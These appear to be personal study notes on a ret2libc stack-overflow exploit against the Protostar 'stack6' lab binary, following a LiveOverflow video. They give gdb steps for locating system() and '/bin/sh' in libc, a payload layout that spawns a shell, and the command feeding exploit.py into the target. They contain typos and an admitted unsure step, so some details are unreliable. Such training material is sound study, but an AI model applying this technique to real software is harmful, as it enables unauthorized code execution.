> LiveOverFlow_bin_0x1D_First_remote_root_exploitret2libc 0x0F

#### __RETURN TO LIBC__
**Known as 'ret2libc'**

```text
Target		: system("/bin/sh") -> Execute shell command using 'system()'.
```
---

#### __LET UNDERSTAND WHAT HAPPEN WHEN SYSTEM IS CALLEDC__

**NOTE: A function points to an address where its INSTRUCTIONS live.**
```text
First, get the address of 'system'
(gdb) p system

Second, before 'eip' jump to 'system' address, the argument "/bin/sh" is pushed into the stack as a string.
eip		: instruction pointer.
```
...
```armasm
...	
mov DWORD PTR [esp], address1 <- contain the string "/bin/sh"
call address2 <system@plt>
...
```
...
```bash
(gdb) x/s address1
address1	: "/bin/sh"
```
###### **LET MAKE A PAYLOAD TO REPRODUCE THE STACK STATE AFTER *CALL* 'SYSTEM' WHICH EXECUTE A BASH INSTRUCTION**

```text
First, let find a string "/bin/sh" to put into the stack. We can search for it in the libc library.

	* first, find the library address.
	> (gdb) info proc map				: print address of memory regions and libraries.

	> (gdb) find libc_address +9999999, "/bin/sh"	: find start_addr, +len, val  <- search for 'val' in the memory region.
	  - find returns "find_addr".
	> x/s find_addr
	ALERT!!! The find technic doesn't work, or it does. I don't care at this point. USE the following technic:

        [shell]$ string -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"  : Search for "/bin/sh" and return its location inside 'libc' as hex address [x]
	> x/s libc_address + hex_addr			       : Add library address to hex_address return by 'grep' to get the real location.
	   - real_address:	"/bin/sh"

We already get the address of 'system' with "p system" <- print 'system' address
```

#### __PAYLOADC__

```text
payload = padding + system_address + return_addr_after_system + bin_sh  

ONE MORE TIME STACK STATE: Before the 'call system' instruction is executed, its parameter "/bin/sh" is store into the stack.
			 : Then, as for all 'call', the return address is pushed into the stack as well.
			 : Using a payload instead of the 'call' instruction, the addr of 'system' come before 'return_add' and 'param_addr'.
			 : The padding puts the 'system' address at the location pointed by "eip" <- INSTRUCTION POINTER. 


DON'T FORGET TO KEEP THE INPUT PIPE OPEN WITH 'cat'
(python exploit.py ; cat) | /repertory/stack6
```






